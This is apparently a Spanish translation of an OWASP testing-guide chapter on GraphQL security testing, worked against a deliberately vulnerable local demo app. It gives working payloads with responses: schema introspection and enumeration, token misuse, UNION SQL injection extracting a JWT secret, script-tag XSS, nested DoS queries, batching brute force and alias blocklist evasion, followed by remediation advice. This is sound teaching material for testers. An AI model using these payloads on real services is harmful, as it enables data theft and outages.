# Pruebas de GraphQL

|ID          |
|------------|
|WSTG-APIT-99|

## Resumen

GraphQL se ha vuelto muy popular en las APIs modernas. Proporciona simplicidad y objetos anidados, lo que facilita un desarrollo más rápido. Si bien cada tecnología tiene ventajas, también puede exponer la aplicación a nuevas superficies de ataque. El propósito de este escenario es proporcionar algunas malas configuraciones comunes y vectores de ataque en aplicaciones que utilizan GraphQL. Algunos vectores son únicos de GraphQL (por ejemplo, [Consulta de Introspección](#consultas-de-introspección)) y otros son genéricos para las APIs (por ejemplo, [inyección SQL](#inyección-sql)).

Los ejemplos en esta sección se basarán en una aplicación GraphQL vulnerable [poc-graphql](https://github.com/righettod/poc-graphql), la cual se ejecuta en un contenedor docker que mapea `localhost:8080/GraphQL` como el nodo GraphQL vulnerable.

## Objetivos de Prueba

- Evaluar que se haya desplegado una configuración segura y lista para producción.
- Validar todos los campos de entrada contra ataques genéricos.
- Asegurar que se apliquen controles de acceso apropiados.

## Cómo Probar

Probar los nodos GraphQL no es muy diferente a probar otras tecnologías de API. Considerar los siguientes pasos:

### Consultas de Introspección

Las consultas de introspección son el método por el cual GraphQL permite preguntar qué consultas son soportadas, qué tipos de datos están disponibles y muchos más detalles que se necesitarán al abordar una prueba de un despliegue GraphQL.

El [sitio web de GraphQL describe la Introspección](https://graphql.org/learn/introspection/):

> "A menudo es útil preguntar a un esquema GraphQL por información sobre qué consultas soporta. GraphQL nos permite hacerlo usando el sistema de introspección."

Hay un par de formas de extraer esta información y visualizar la salida, de la siguiente manera.

#### Usar Introspección Nativa de GraphQL

La forma más directa es enviar una solicitud HTTP (usando un proxy personal) con el siguiente payload, tomado de un artículo en [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696):

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

El resultado usualmente será muy largo (y por lo tanto se ha abreviado aquí), y contendrá el esquema completo del despliegue GraphQL.

Respuesta:

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "Un enum que describe qué tipo de tipo es un __Type dado",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indica que este tipo es un escalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indica que este tipo es un objeto. `fields` e `interfaces` son campos válidos.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indica que este tipo es una interfaz. `fields` y `possibleTypes` son campos válidos.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indica que este tipo es una unión. `possibleTypes` es un campo válido.",
              "isDeprecated": false,
              "deprecationReason": null
            },
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

Una herramienta como [GraphQL Voyager](https://apis.guru/graphql-voyager/) puede ser usada para obtener una mejor comprensión del endpoint GraphQL:

![GraphQL Voyager](images/Voyager.png)\
*Figura 12.1-1: GraphQL Voyager*

Esta herramienta crea una representación de Diagrama de Entidad-Relación (ERD) del esquema GraphQL, permitiendo obtener una mejor vista de las partes móviles del sistema que se está probando. Extraer información del dibujo permite ver, por ejemplo, que se puede consultar la tabla Dog. También muestra qué propiedades tiene un Dog:

- ID
- name
- veterinary (ID)

Hay una desventaja al usar este método: GraphQL Voyager no muestra todo lo que se puede hacer con GraphQL. Por ejemplo, las mutaciones disponibles no se listan en el dibujo anterior. Una mejor estrategia sería usar tanto Voyager como uno de los métodos listados a continuación.

#### Usar GraphiQL

[GraphiQL](https://github.com/graphql/graphiql) es un IDE basado en web para GraphQL. Es parte del proyecto GraphQL, y se usa principalmente para depuración o propósitos de desarrollo. La mejor práctica es no permitir a los usuarios acceder a él en despliegues de producción. Si se está probando un entorno de staging, se podría tener acceso a él y así ahorrar algo de tiempo al trabajar con consultas de introspección (aunque, por supuesto, se puede usar la introspección en la interfaz de GraphiQL).

GraphiQL tiene una sección de documentación, la cual usa los datos del esquema para crear un documento de la instancia GraphQL que se está utilizando. Este documento contiene los tipos de datos, mutaciones y básicamente toda la información que puede ser extraída usando introspección.

#### Usar GraphQL Playground

[GraphQL Playground](https://github.com/graphql/graphql-playground) es un cliente GraphQL. Puede ser usado para probar diferentes consultas, así como dividir IDEs GraphQL en diferentes playgrounds, y agruparlos por tema o asignándoles un nombre. Al igual que GraphiQL, Playground puede crear documentación sin necesidad de enviar manualmente consultas de introspección y procesar las respuestas. Tiene otra gran ventaja: no necesita que la interfaz de GraphiQL esté disponible. Se puede dirigir la herramienta al nodo GraphQL vía una URL, o usarla localmente con un archivo de datos. GraphQL Playground puede ser usado para probar vulnerabilidades directamente, por lo que no se necesita usar un proxy personal para enviar solicitudes HTTP. Esto significa que se puede usar esta herramienta para interacción simple y evaluación de GraphQL. Para otros payloads más avanzados, usar un proxy personal.

En algunos casos, será necesario configurar los encabezados HTTP en la parte inferior, para incluir el ID de sesión u otro mecanismo de autenticación. Esto todavía permite crear múltiples "IDEs" con diferentes permisos para verificar si hay problemas de autorización.

![Playground1](images/Playground1.png)\
*Figura 12.1-2: Documentación de API de Alto Nivel de GraphQL Playground*

![Playground2](images/Playground2.png)\
*Figura 12.1-3: Esquema de API de GraphQL Playground*

Incluso se pueden descargar los esquemas para usar en Voyager.

#### Fuga de Esquema a Través de Sugerencias de Campos

Muchas implementaciones de servidores GraphQL (incluyendo Apollo Server y `graphql-js`) devuelven sugerencias "Did you mean...?" ("¿Quisiste decir...?") por defecto siempre que un cliente referencia un nombre de campo que no existe. Este comportamiento ayuda al desarrollo pero filtra información del esquema incluso cuando la introspección ha sido explícitamente deshabilitada.

Enviar un nombre de campo con una pequeña falta de ortografía para probar esto. Si el servidor devuelve una sugerencia en la respuesta de error, la respuesta revela el nombre real del campo sin emitir una consulta de introspección.

Por ejemplo, enviar una solicitud con un campo no existente `userss`:

```graphql
query {
  userss {
    id
  }
}
```

Un servidor vulnerable revela el nombre real del campo en su respuesta:

```json
{
  "errors": [
    {
      "message": "Cannot query field \"userss\" on type \"Query\". Did you mean \"users\"?",
      "locations": [{ "line": 2, "column": 3 }]
    }
  ]
}
```

Iterar sobre variantes de nombres adivinados (por ejemplo, `userss`, `usesr`, `usres`) para enumerar nombres válidos de consultas y mutaciones, una sugerencia a la vez. Hacerlo puede reconstruir una porción sustancial del esquema sin acceso a introspección.

[Clairvoyance](https://github.com/nikitastupin/clairvoyance) automatiza este proceso combinando una wordlist con respuestas de sugerencias para construir incrementalmente un esquema.

#### Conclusión sobre Introspección

La introspección es una herramienta útil que permite a los usuarios obtener más información sobre el despliegue GraphQL. Sin embargo, esto también permitirá a usuarios maliciosos obtener acceso a la misma información. La mejor práctica es limitar el acceso a las consultas de introspección, ya que algunas herramientas o solicitudes podrían fallar si esta característica se deshabilita por completo. Como GraphQL usualmente hace de puente hacia las APIs del backend del sistema, es mejor imponer controles de acceso estrictos.

Deshabilitar la introspección por sí solo no es suficiente. Deshabilitar también las sugerencias de campos en producción, ya que independientemente permiten la enumeración del esquema.

### Autorización

La introspección es el primer lugar para buscar problemas de autorización. Como se señaló, el acceso a la introspección debería estar restringido ya que permite extracción y recopilación de datos. Una vez que un tester tiene acceso al esquema y conocimiento de la información sensible que hay para extraer, debería enviar consultas que no serán bloqueadas debido a privilegios insuficientes. GraphQL no impone permisos por defecto, por lo que depende de la aplicación realizar la imposición de autorización.

En los ejemplos anteriores, la salida de la consulta de introspección muestra que hay una consulta llamada `auth`. Este parece un buen lugar para extraer información sensible tal como tokens de API, contraseñas, etc.

![Auth GraphQL Query](images/auth1.png)\
*Figura 12.1-4: API de Consulta de Auth en GraphQL*

Probar la implementación de autorización varía de un despliegue a otro, ya que cada esquema tendrá diferente información sensible y, por lo tanto, diferentes objetivos en los que enfocarse.

En este ejemplo vulnerable, cada usuario (incluso no autenticado) puede obtener acceso a los tokens de autenticación de cada veterinario listado en la base de datos. Estos tokens pueden ser usados para realizar acciones adicionales que el esquema permite, tales como asociar o desasociar un perro de cualquier veterinario especificado usando mutaciones, incluso si no hay un token de autenticación coincidente para el veterinario en la solicitud.

Aquí hay un ejemplo en el cual el tester usa un token extraído que no posee para realizar una acción como el veterinario "Benoit":

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

Y la respuesta:

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```

Todos los perros en la lista pertenecen a Benoit, y no al dueño del token de autenticación. Es posible realizar este tipo de acción cuando no se implementa una imposición de autorización apropiada.

### Inyección

GraphQL es la implementación de la capa de API de una aplicación, y como tal, usualmente reenvía las solicitudes a una API de backend o a la base de datos directamente. Esto permite utilizar cualquier vulnerabilidad subyacente tal como inyección SQL, inyección de comandos, cross-site scripting, etc. Usar GraphQL solo cambia el punto de entrada del payload malicioso.

Se puede hacer referencia a otros escenarios dentro de la guía de pruebas de OWASP para obtener algunas ideas.

GraphQL también tiene escalares, los cuales usualmente se usan para tipos de datos personalizados que no tienen tipos de datos nativos, tales como DateTime. Estos tipos de datos no tienen validación lista para usar, lo que los hace buenos candidatos para pruebas.

#### Inyección SQL

La aplicación de ejemplo es vulnerable por diseño en la consulta `dogs(namePrefix: String, limit: Int = 500): [Dog!]` ya que el parámetro `namePrefix` se concatena en la consulta SQL. Concatenar entrada de usuario es una mala práctica común de aplicaciones que puede exponerlas a inyección SQL.

La siguiente consulta extrae información de la tabla `CONFIG` dentro de la base de datos:

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

La respuesta a esta consulta es:

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 3,
        "name": "..."
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

La consulta contiene el secreto que firma los JWTs en la aplicación de ejemplo, lo cual es información muy sensible.

Para saber qué buscar en cualquier aplicación en particular, será útil recopilar información sobre cómo está construida la aplicación y cómo están organizadas las tablas de la base de datos. También se pueden usar herramientas como `sqlmap` para buscar rutas de inyección e incluso automatizar la extracción de datos de la base de datos.

#### Cross-Site Scripting (XSS)

El cross-site scripting ocurre cuando un atacante inyecta código ejecutable que posteriormente es ejecutado por el navegador. Conocer las pruebas para XSS en el capítulo de [Validación de Entrada](../07-Input_Validation_Testing/README.md). Se puede probar el XSS reflejado usando un payload de [Pruebas de Cross Site Scripting Reflejado](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md).

En este ejemplo, los errores podrían reflejar la entrada y causar que ocurra XSS.

Payload:

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

Respuesta:

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

### Consultas de Denegación de Servicio (DoS)

GraphQL expone una interfaz muy simple para permitir a los desarrolladores usar consultas anidadas y objetos anidados. Esta capacidad también puede ser usada de manera maliciosa, llamando una consulta profundamente anidada similar a una función recursiva y causando una denegación de servicio agotando la CPU, memoria u otros recursos de cómputo.

Mirando hacia atrás la *Figura 12.1-1*, se puede ver que es posible crear un bucle donde un objeto Dog contiene un objeto Veterinary. Podría haber una cantidad infinita de objetos anidados.

Esto permite una consulta profunda que tiene el potencial de sobrecargar la aplicación:

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Hay múltiples medidas de seguridad que pueden ser implementadas para prevenir estos tipos de consultas, listadas en la sección de [Remediación](#remediación). Las consultas abusivas pueden causar problemas como DoS para los despliegues de GraphQL y deberían ser incluidas en las pruebas.

### Ataques de Lotes (Batching)

GraphQL soporta el procesamiento por lotes (batching) de múltiples consultas en una sola solicitud. Esto permite a los usuarios solicitar múltiples objetos o múltiples instancias de objetos eficientemente. Sin embargo, un atacante puede utilizar esta funcionalidad para realizar un ataque de lotes. Enviar más de una consulta en una sola solicitud se ve así:

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

En la aplicación de ejemplo, se puede enviar una sola solicitud para extraer todos los nombres de veterinarios usando el ID adivinable (es un entero incremental). Un atacante puede entonces utilizar los nombres para obtener tokens de acceso. En lugar de hacerlo en muchas solicitudes, las cuales podrían ser bloqueadas por una medida de seguridad de red como un firewall de aplicaciones web o un limitador de tasa como Nginx, estas solicitudes pueden ser agrupadas en lotes. Esto significa que habría solo un par de solicitudes, lo que podría permitir fuerza bruta eficiente sin ser detectado. Aquí hay una consulta de ejemplo:

```graphql
query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}
```

Esto proporcionará al atacante los nombres de los veterinarios y, como se mostró antes, los nombres pueden ser usados para agrupar múltiples consultas solicitando los tokens de autenticación de esos veterinarios. Por ejemplo:

```graphql
query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}
```

Los ataques de lotes pueden ser usados para evadir muchas medidas de seguridad impuestas en los sitios. También pueden ser usados para enumerar objetos e intentar forzar bruscamente la autenticación multifactor u otra información sensible.

### Evasión de Lista de Bloqueo de Consultas vía Alias

GraphQL permite dar a cualquier campo en una consulta un alias — un nombre alternativo usado para etiquetar el resultado. Esta es una característica estándar del lenguaje, pero puede ser abusada para evadir controles de seguridad pobremente implementados que buscan nombres de campo específicos.

Algunos despliegues implementan una lista de bloqueo de consultas usando coincidencia ingenua de cadenas o expresiones regulares en el documento GraphQL crudo (por ejemplo, rechazando cualquier consulta que contenga el nombre de campo `adminUsers` solo cuando aparece como `adminUsers {` o `adminUsers(`, sin analizar completamente la sintaxis o construir un AST). Una implementación robusta que busque `adminUsers` como una subcadena en cualquier parte de la solicitud, o que analice correctamente la estructura de la consulta, todavía detectará las llamadas con alias, porque el nombre de campo subyacente `adminUsers` sigue presente en la operación y no es renombrado ni eliminado por el alias. Sin embargo, las verificaciones simplistas que no manejan la sintaxis `aliasName: fieldName` pueden ser evadidas emitiendo el mismo campo bajo un alias, mientras el resolver de `adminUsers` continúa ejecutándose en el servidor. En terminología GraphQL, `adminUsers` en los ejemplos siguientes es un nombre de campo; un nombre de operación aparecería después de la palabra clave `query` (por ejemplo, `query GetAdmins { ... }`).

Primero, enviar la consulta directamente para confirmar que está bloqueada:

```graphql
query {
  adminUsers {
    id
    name
    email
  }
}
```

Respuesta (bloqueada por la lista de bloqueo):

```json
{
  "errors": [
    {
      "message": "400 Bad Request: query not allowed"
    }
  ]
}
```

Luego, reenviar la misma consulta usando un alias:

```graphql
query {
  s: adminUsers {
    id
    name
    email
  }
}
```

Respuesta (lista de bloqueo evadida, datos devueltos):

```json
{
  "data": {
    "s": [
      { "id": 1, "name": "Admin", "email": "admin@example.com" }
    ]
  }
}
```

El servidor resuelve `s` como `adminUsers` porque los alias son un constructo de la capa GraphQL — el resolver subyacente se ejecuta normalmente. Una lista de bloqueo que coincida solo con el nombre de campo literal en el cuerpo de la solicitud no atrapará las llamadas con alias.

Para cada consulta que parezca estar bloqueada o restringida, intentar prefijarla con un alias arbitrario (por ejemplo, `x:`, `s:`, `bypass:`) y observar si la respuesta cambia de un error a un payload de datos exitoso.

### Mensajes de Error Detallados

GraphQL puede encontrar errores inesperados durante la ejecución. Cuando ocurre tal error, el servidor puede enviar una respuesta de error que puede revelar detalles internos del error o configuraciones de la aplicación o datos. Esto permite a un usuario malicioso adquirir más información sobre la aplicación. Como parte de las pruebas, los mensajes de error deberían ser verificados enviando datos inesperados, un proceso conocido como fuzzing. Las respuestas deberían ser buscadas en busca de información potencialmente sensible que pueda ser revelada usando esta técnica.

### Exposición de la API Subyacente

GraphQL es una tecnología relativamente nueva, y algunas aplicaciones están transitando de APIs antiguas a GraphQL. En muchos casos, GraphQL se despliega como una API estándar que traduce las solicitudes (enviadas usando sintaxis GraphQL) a una API subyacente, así como las respuestas. Si las solicitudes a la API subyacente no son verificadas apropiadamente para autorización, podría llevar a una posible escalada de privilegios.

Por ejemplo, una solicitud que contenga el parámetro `id=1/delete` podría ser interpretada como `/api/users/1/delete`. Esto podría extenderse a la manipulación de otros recursos pertenecientes a `user=1`. También es posible que la solicitud sea interpretada como teniendo la autorización dada al nodo GraphQL, en lugar del solicitante real.

Un tester debería intentar ganar acceso a los métodos de la API subyacente ya que podría ser posible escalar privilegios.

## Remediación

- Restringir el acceso a las consultas de introspección.
- Deshabilitar las sugerencias de campos en producción: la mayoría de los servidores GraphQL permiten desactivarlas (por ejemplo, en Apollo Server, establecer [hideSchemaDetailsFromClientErrors](https://www.apollographql.com/docs/apollo-server/api/apollo-server#hideschemadetailsfromclienterrors)). Esto previene la enumeración del esquema a través de respuestas de error "Did you mean?".
- Implementar validación de entrada.
    - GraphQL no tiene una forma nativa de validar la entrada; sin embargo, hay un proyecto de código abierto llamado ["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive) que permite la validación de entrada como parte de la definición del esquema.
    - La validación de entrada por sí sola es útil, pero no es una solución completa y deberían tomarse medidas adicionales para mitigar los ataques de inyección.
- Implementar medidas de seguridad para prevenir consultas abusivas.
    - Timeouts: restringir la cantidad de tiempo que se permite que se ejecute una consulta.
    - Profundidad máxima de consulta: limitar la profundidad de las consultas permitidas, lo que puede prevenir que las consultas demasiado profundas abusen de los recursos.
    - Establecer complejidad máxima de consulta: limitar la complejidad de las consultas para mitigar el abuso de los recursos de GraphQL.
    - Usar limitación basada en tiempo del servidor: limitar la cantidad de tiempo de servidor que un usuario puede consumir.
    - Usar limitación basada en complejidad de consulta: limitar la complejidad total de consultas que un usuario puede consumir.
- Enviar mensajes de error genéricos: usar mensajes de error genéricos que no revelen detalles del despliegue.
- Mitigar ataques de lotes:
    - Añadir limitación de tasa de solicitud de objetos en el código.
    - Prevenir el procesamiento por lotes para objetos sensibles.
    - Limitar el número de consultas que pueden ejecutarse a la vez.
- Prevenir la evasión de la lista de bloqueo de consultas: implementar controles de acceso a nivel de resolver en lugar de confiar únicamente en listas de bloqueo de nombres de operación, ya que los alias de GraphQL permiten a los llamadores invocar cualquier campo bajo un nombre arbitrario.

Para más información sobre la remediación de debilidades de GraphQL, referirse a la [Hoja de Referencia de GraphQL](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).

## Herramientas

- [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL (Extensión de Burp)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [GraphQL Raider (Extensión de Burp)](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL (Add-on para ZAP)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)
- [GraphQLer](https://github.com/omar2535/GraphQLer)
- [Clairvoyance](https://github.com/nikitastupin/clairvoyance)

## Referencias

- [poc-graphql](https://github.com/righettod/poc-graphql)
- [Sitio Oficial de GraphQL](https://graphql.org/learn/)
- [Howtographql - Seguridad](https://www.howtographql.com/advanced/4-security/)
- [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)
- [Pruebas del Lado del Cliente](../11-Client-side_Testing/README.md) (XSS y otras vulnerabilidades)
- [5 Vulnerabilidades Comunes de Seguridad de GraphQL](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [Vulnerabilidades comunes de GraphQL y cómo explotarlas](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [Hoja de Referencia de GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [Conceptos Básicos de Enumeración de GraphQL](https://blog.cyberadvisors.com/technical-blog/blog/graphql-apis-enumeration-basics)
- [Vulnerabilidades de API GraphQL](https://portswigger.net/web-security/graphql)
